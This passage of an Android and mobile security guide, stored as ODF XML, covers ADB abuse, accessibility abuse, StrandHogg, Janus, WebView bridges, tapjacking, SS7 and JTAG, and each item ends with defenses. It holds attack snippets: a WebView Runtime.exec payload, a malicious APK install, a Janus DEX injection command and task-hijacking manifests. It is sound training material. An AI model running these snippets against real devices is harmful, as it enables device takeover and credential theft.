      <text:p text:style-name="P27"><text:soft-page-break/># ADB attack simulation</text:p>
      <text:p text:style-name="P27">adb devices</text:p>
      <text:p text:style-name="P27">adb shell</text:p>
      <text:p text:style-name="P27">adb pull /data/data/com.example.app/databases</text:p>
      <text:p text:style-name="P27">adb install malicious.apk</text:p>
      <text:p text:style-name="P27">adb shell screencap /sdcard/screen.png</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Defense:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Disable Developer Options and USB Debugging when not in use</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use strong screen locks to prevent unauthorized ADB authorization</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Monitor ADB authorization requests</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Disable ADB over network</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use device management policies to enforce ADB restrictions</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P4">11. Accessibility Service Abuse</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T4">Affected Component</text:span>: Android Accessibility Service</text:p>
      <text:p text:style-name="Preformatted_20_Text">Detailed Information: The Accessibility Service, designed to help users with disabilities, has become one of the most abused Android permissions. Once enabled, it can read screen content, inject gestures, and control apps. Malware increasingly tricks users into enabling accessibility for malicious apps, allowing keylogging, credential theft, and bypassing lock screens. Banking trojans like Cerberus and EventBot specifically target this permission.</text:p>
      <text:p text:style-name="Preformatted_20_Text">How to Practice:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Create a test app that requests Accessibility permission</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Demonstrate screen reading capabilities</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Show how to simulate user interactions</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>4. Test detection mechanisms</text:p>
      <text:p text:style-name="P27">&lt;!-- Accessibility service declaration --&gt;</text:p>
      <text:p text:style-name="P27">&lt;service</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>android:name=".MaliciousAccessibilityService"</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"&gt;</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>&lt;intent-filter&gt;</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>&lt;action android:name="android.accessibilityservice.AccessibilityService" /&gt;</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>&lt;/intent-filter&gt;</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>&lt;meta-data</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>android:name="android.accessibilityservice"</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>android:resource="@xml/accessibility_service_config" /&gt;</text:p>
      <text:p text:style-name="P27">&lt;/service&gt;</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="Preformatted_20_Text">Defense:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Scrutinize apps requesting Accessibility permission</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Review installed accessibility services regularly</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use Google Play Protect</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Implement behavioral detection for unusual accessibility usage</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Educate users about social engineering tactics</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P4">12. StrandHogg Vulnerability (Task Hijacking)</text:p>
      <text:p text:style-name="Preformatted_20_Text">Affected Component: Android task management</text:p>
      <text:p text:style-name="Preformatted_20_Text">Detailed Information: StrandHogg (CVE-2020-0096) allows malicious apps to overlay their activities on top of legitimate apps, tricking users into entering credentials into fake login screens. The vulnerability exploits Android's task affinity feature, allowing attackers to "hijack" tasks and insert their activities into legitimate app stacks. When users switch between apps, they may unknowingly interact with malicious overlays.</text:p>
      <text:p text:style-name="Preformatted_20_Text">How to Practice:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Create a test app with specific task affinity settings</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Launch target legitimate app</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Trigger malicious overlay</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>4. Demonstrate how users can be deceived</text:p>
      <text:p text:style-name="P27"><text:soft-page-break/>&lt;!-- Manifest configuration for task hijacking --&gt;</text:p>
      <text:p text:style-name="P27">&lt;activity</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>android:name=".MaliciousActivity"</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>android:taskAffinity="com.target.app"</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>android:launchMode="singleTask"&gt;</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>&lt;intent-filter&gt;</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>&lt;action android:name="android.intent.action.MAIN" /&gt;</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>&lt;category android:name="android.intent.category.LAUNCHER" /&gt;</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>&lt;/intent-filter&gt;</text:p>
      <text:p text:style-name="P27">&lt;/activity&gt;</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P4">Defense:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Apply Android security patches (fixed in April 2020 update)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Enable Google Play Protect</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Be cautious when switching between apps</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Check URL bars and app interfaces carefully</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use biometric authentication where possible</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P4">13. Janus Vulnerability (APK Signature Bypass)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T2">Affected Component:</text:span> APK signature verification</text:p>
      <text:p text:style-name="Preformatted_20_Text">Detailed Information: Janus (CVE-2017-13156) allowed attackers to append malicious code to legitimate APK files without breaking their signatures. The vulnerability exploited Android's handling of DEX files, allowing attackers to create hybrid files that appear valid to both signature verification and the runtime. This enabled malware to masquerade as legitimate apps while maintaining original signatures.</text:p>
      <text:p text:style-name="Preformatted_20_Text">How to Practice:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Obtain a legitimate APK</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Use Janus exploitation tools</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Append malicious DEX code</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>4. Install and test the modified APK</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27"># Janus exploitation example</text:p>
      <text:p text:style-name="P27">java -jar janus.jar original.apk payload.dex output.apk</text:p>
      <text:p text:style-name="P27">adb install output.apk</text:p>
      <text:p text:style-name="P40"/>
      <text:p text:style-name="P40">Defense:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Apply Android security updates (fixed in December 2017)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Install apps only from Google Play Store</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Enable Google Play Protect</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use APK verification tools</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Consider using APK signature scheme v2 and v3</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T2">14.</text:span><text:span text:style-name="T10"> BlueBorne Bluetooth Vulnerabilities</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text">Affected Component: Bluetooth stack</text:p>
      <text:p text:style-name="Preformatted_20_Text">Detailed Information: BlueBorne is a set of Bluetooth vulnerabilities affecting billions of devices. Attackers can take over devices, spread malware, or establish man-in-the-middle positions without any user interaction. The vulnerabilities exist in the Bluetooth implementation itself, allowing remote code execution without pairing or user consent. This affects all Android versions prior to September 2017 security patches.</text:p>
      <text:p text:style-name="Preformatted_20_Text">How to Practice:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Set up Bluetooth testing environment with vulnerable devices</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Use BlueBorne exploitation tools</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Practice in isolated network</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>4. Monitor for successful exploitation</text:p>
      <text:p text:style-name="P27"># BlueBorne scanner</text:p>
      <text:p text:style-name="P27">git clone https://github.com/armis-dev/blueborne-scanner.git</text:p>
      <text:p text:style-name="P27">cd blueborne-scanner</text:p>
      <text:p text:style-name="P27"><text:soft-page-break/>python blueborne_scanner.py</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Defense:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Apply security patches</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Disable Bluetooth when not in use</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use Bluetooth only in trusted environments</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Keep devices updated</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Monitor for suspicious Bluetooth activity</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P41">Application Layer Vulnerabilities</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P4">15. WebView JavaScript Bridge Exploitation</text:p>
      <text:p text:style-name="Preformatted_20_Text">Affected Component: Android WebView</text:p>
      <text:p text:style-name="Preformatted_20_Text">Detailed Information: WebView components in Android apps often expose JavaScript bridges that allow web content to call native app functions. When improperly secured, attackers can exploit these bridges through XSS vulnerabilities or malicious web content. This can lead to arbitrary code execution, data theft, or privilege escalation. The addJavascriptInterface() method is particularly dangerous if used with untrusted content.</text:p>
      <text:p text:style-name="Preformatted_20_Text">How to Practice:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Create a test app with WebView and JavaScript interface</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Load malicious HTML content</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Demonstrate JavaScript calling native methods</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>4. Test for proper URL validation</text:p>
      <text:p text:style-name="P27">// Vulnerable WebView configuration</text:p>
      <text:p text:style-name="P27">webView.addJavascriptInterface(new JSInterface(), "Android");</text:p>
      <text:p text:style-name="P27">webView.loadUrl("http://malicious-site.com");</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27">// Malicious JavaScript</text:p>
      <text:p text:style-name="P27">&lt;script&gt;</text:p>
      <text:p text:style-name="P27">Android.getClass().forName('java.lang.Runtime')</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>.getMethod('getRuntime',null).invoke(null,null)</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>.exec('id');</text:p>
      <text:p text:style-name="P27">&lt;/script&gt;</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P4">Defense:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use @JavascriptInterface annotation (Android 4.2+)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Validate URLs before loading</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Disable JavaScript if not needed</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use setAllowFileAccess(false)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Implement CSP headers for loaded content</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P4">16. Insecure Data Storage</text:p>
      <text:p text:style-name="Preformatted_20_Text">Affected Component: App data storage</text:p>
      <text:p text:style-name="Preformatted_20_Text">Detailed Information: Many Android apps store sensitive data insecurely, including credentials, tokens, and personal information. Common issues include:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Storing data in world-readable files</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Using insecure SharedPreferences without encryption</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Logging sensitive information</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Caching data in external storage</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Not using Android Keystore for cryptographic keys</text:p>
      <text:p text:style-name="Preformatted_20_Text">How to Practice:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Install target app on test device</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Use ADB to access app data directory</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Analyze databases, shared preferences, and files</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>4. Check for sensitive information exposure</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P27"><text:soft-page-break/># Access app data (requires root or debug build)</text:p>
      <text:p text:style-name="P27">adb shell</text:p>
      <text:p text:style-name="P27">run-as com.target.app</text:p>
      <text:p text:style-name="P27">cd /data/data/com.target.app/</text:p>
      <text:p text:style-name="P27">ls -la</text:p>
      <text:p text:style-name="P27">sqlite3 databases/data.db .dump</text:p>
      <text:p text:style-name="P27">cat shared_prefs/config.xml</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">Defense:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use Android Keystore for cryptographic keys</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Encrypt sensitive data with user credentials</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Store data in internal storage only</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use EncryptedSharedPreferences</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Avoid logging sensitive information</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Implement secure deletion</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P4">17. Insecure Deep Linking</text:p>
      <text:p text:style-name="Preformatted_20_Text">Affected Component: Android intents and URL handling</text:p>
      <text:p text:style-name="Preformatted_20_Text">Detailed Information: Apps that improperly handle deep links can be exploited through malicious URLs. Attackers can craft links that trigger unintended actions, pass malicious data, or bypass authentication. This is particularly dangerous in OAuth flows and account linking scenarios. The vulnerability arises from insufficient validation of incoming intent data and URLs.</text:p>
      <text:p text:style-name="Preformatted_20_Text">How to Practice:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Analyze app's intent filters</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Create malicious intents targeting exported activities</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Test URL schemes and deep links</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>4. Attempt to pass malformed data</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P42">&lt;!-- Vulnerable intent filter --&gt;</text:p>
      <text:p text:style-name="P42">&lt;intent-filter&gt;</text:p>
      <text:p text:style-name="P42"><text:s text:c="4"/>&lt;action android:name="android.intent.action.VIEW" /&gt;</text:p>
      <text:p text:style-name="P42"><text:s text:c="4"/>&lt;category android:name="android.intent.category.DEFAULT" /&gt;</text:p>
      <text:p text:style-name="P42"><text:s text:c="4"/>&lt;data android:scheme="myapp" /&gt;</text:p>
      <text:p text:style-name="P42">&lt;/intent-filter&gt;</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Defense:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Validate all incoming intent data</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use explicit intents for internal components</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Set android:exported="false" for internal components</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Implement proper URL validation</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use Android App Links with domain verification</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T2">18. Tapjacking (Overlay Attacks)</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text">Affected Component: Android window management</text:p>
      <text:p text:style-name="Preformatted_20_Text">Detailed Information: Tapjacking attacks use malicious overlays to trick users into clicking invisible buttons that perform unintended actions. Attackers create translucent windows that capture taps and forward them to underlying applications. This can lead to installing malware, granting permissions, or authorizing payments without user awareness. The SYSTEM_ALERT_WINDOW permission is particularly dangerous.</text:p>
      <text:p text:style-name="Preformatted_20_Text">How to Practice:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Create an app with SYSTEM_ALERT_WINDOW permission</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Draw overlay windows with captured click handling</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Position overlays over critical UI elements</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>4. Demonstrate tapjacking scenarios</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P42"><text:soft-page-break/>// Tapjacking overlay creation</text:p>
      <text:p text:style-name="P42">WindowManager.LayoutParams params = new WindowManager.LayoutParams(</text:p>
      <text:p text:style-name="P42"><text:s text:c="4"/>WindowManager.LayoutParams.MATCH_PARENT,</text:p>
      <text:p text:style-name="P42"><text:s text:c="4"/>WindowManager.LayoutParams.MATCH_PARENT,</text:p>
      <text:p text:style-name="P42"><text:s text:c="4"/>WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,</text:p>
      <text:p text:style-name="P42"><text:s text:c="4"/>WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,</text:p>
      <text:p text:style-name="P42"><text:s text:c="4"/>PixelFormat.TRANSLUCENT);</text:p>
      <text:p text:style-name="Preformatted_20_Text">Defense:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use android:filterTouchesWhenObscured="true" in sensitive views</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Set FLAG_WINDOW_IS_OBSCURED checks</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Warn users about overlay permissions</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Limit SYSTEM_ALERT_WINDOW permission</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Implement secure input methods</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T2">19. Fragment Injection</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text">Affected Component: Android fragment management</text:p>
      <text:p text:style-name="Preformatted_20_Text">Detailed Information: Fragment injection vulnerabilities occur when apps use PreferenceActivity with improper validation of fragment names. Attackers can inject arbitrary fragments by passing malicious intent extras, potentially loading unauthorized UI components or exposing sensitive functionality. This affects apps extending PreferenceActivity without proper fragment validation.</text:p>
      <text:p text:style-name="Preformatted_20_Text">How to Practice:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Identify apps using PreferenceActivity</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Analyze fragment handling code</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Create intents with malicious fragment names</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>4. Test for unauthorized fragment loading</text:p>
      <text:p text:style-name="P27">// Vulnerable PreferenceActivity</text:p>
      <text:p text:style-name="P27">Intent intent = new Intent();</text:p>
      <text:p text:style-name="P27">intent.putExtra(":android:show_fragment", "com.malicious.Fragment");</text:p>
      <text:p text:style-name="P27">startActivity(intent);</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="Preformatted_20_Text">Defense:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Override isValidFragment() to validate fragment names</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use PreferenceFragmentCompat from AndroidX</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Avoid exporting PreferenceActivity</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Validate all intent parameters</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Keep Android support libraries updated</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P37">Network &amp; Protocol Vulnerabilities</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P4">20. SS7 Protocol Vulnerabilities</text:p>
      <text:p text:style-name="Preformatted_20_Text">Affected Component: Signaling System No. 7 (SS7)</text:p>
      <text:p text:style-name="Preformatted_20_Text">Detailed Information: SS7 is the backbone protocol for global telecom networks, designed decades ago without security considerations. Attackers who gain access to SS7 networks can track device locations, intercept SMS messages (including 2FA codes), forward calls, and disable service. This affects all mobile devices regardless of OS. Commercial SS7 access is available through various brokers, and numerous attacks have been documented.</text:p>
      <text:p text:style-name="Preformatted_20_Text">How to Practice:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Set up SS7 testing environment with open-source tools</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Use software-defined radio and openBSC</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Practice in isolated laboratory network</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>4. Monitor SS7 message flows</text:p>
      <text:p text:style-name="P27"># SS7 testing tools</text:p>
      <text:p text:style-name="P27">git clone https://github.com/ernw/ss7MAPer.git</text:p>
      <text:p text:style-name="P27">cd ss7MAPer</text:p>
      <text:p text:style-name="P27">./ss7maper.py –help</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P4"><text:soft-page-break/>Defense:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use app-based 2FA instead of SMS</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Enable SS7 filtering at carrier level</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Monitor for suspicious SMS patterns</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use encrypted messaging apps</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Consider hardware security keys (FIDO2)</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P4">21. 4G/5G Downgrade Attacks</text:p>
      <text:p text:style-name="Preformatted_20_Text">Affected Component: Mobile network protocols</text:p>
      <text:p text:style-name="Preformatted_20_Text">Detailed Information: Despite improved security in 4G and 5G networks, attackers can force devices to downgrade to 2G or 3G connections where security is weaker. This is accomplished through fake base stations or by jamming 4G/5G frequencies. Once downgraded, attackers can use IMSI catchers and interception tools to capture traffic. The attack exploits the lack of backward compatibility security in device implementations.</text:p>
      <text:p text:style-name="Preformatted_20_Text">How to Practice:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Set up jamming equipment for specific frequency bands</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Configure fake base stations for 2G/3G</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Monitor device connection behavior</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>4. Practice in Faraday-caged environment</text:p>
      <text:p text:style-name="Preformatted_20_Text">Defense:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Disable 2G/3G on device when possible</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use "LTE only" or "5G only" mode</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Enable network encryption requirements</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use VPN for all traffic</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Monitor for unexpected network changes</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P4">22. Wi-Fi Calling Vulnerabilities</text:p>
      <text:p text:style-name="Preformatted_20_Text">Affected Component: Wi-Fi calling implementation</text:p>
      <text:p text:style-name="Preformatted_20_Text">Detailed Information: Wi-Fi calling extends mobile network services over internet connections, but introduces new attack vectors. Poorly implemented security in Wi-Fi calling can allow attackers on the same network to intercept calls, spoof caller ID, or hijack sessions. The feature often bypasses VPN encryption and may leak location information.</text:p>
      <text:p text:style-name="Preformatted_20_Text">How to Practice:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Enable Wi-Fi calling on test device</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Set up packet capture on local network</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Analyze traffic patterns and encryption</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>4. Attempt man-in-the-middle attacks</text:p>
      <text:p text:style-name="P27"># Capture Wi-Fi calling traffic</text:p>
      <text:p text:style-name="P27">sudo tcpdump -i wlan0 -w wifi_calling.pcap</text:p>
      <text:p text:style-name="P27">tshark -r wifi_calling.pcap -Y "ip.addr == [carrier_ip]"</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Defense:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Disable Wi-Fi calling when not needed</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use VPN alongside Wi-Fi calling</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Keep device firmware updated</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Monitor for unusual call behavior</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use encrypted calling apps for sensitive conversations</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P37">Hardware &amp; Physical Vulnerabilities</text:p>
      <text:p text:style-name="P4">23. JTAG/SWD Debug Interface Exploitation</text:p>
      <text:p text:style-name="Preformatted_20_Text">Affected Component: Hardware debug interfaces</text:p>
      <text:p text:style-name="Preformatted_20_Text">Detailed Information: Many devices leave JTAG or Serial Wire Debug (SWD) interfaces accessible on circuit boards. These interfaces provide full debug access to processors, allowing reading of memory, firmware extraction, and code execution. Physical access to the device is required, making this relevant for forensic analysis and hardware hacking. Some devices disable these interfaces in production, but many do not.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/>How to Practice:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Identify JTAG/SWD pins on device circuit board</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Use debuggers like Segger J-Link or OpenOCD</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Connect to debug interface</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>4. Practice memory dumping and analysis</text:p>
      <text:p text:style-name="P27"># OpenOCD configuration for JTAG</text:p>
      <text:p text:style-name="P27">source [find interface/jlink.cfg]</text:p>
      <text:p text:style-name="P27">source [find target/omap4430.cfg]</text:p>
      <text:p text:style-name="P27">init</text:p>
      <text:p text:style-name="P27">halt</text:p>
      <text:p text:style-name="P27">dump_image firmware.bin 0x00000000 0x100000</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P4">Defense:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Disable debug interfaces in production (fuse blowing)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use secure boot chain verification</text:p>
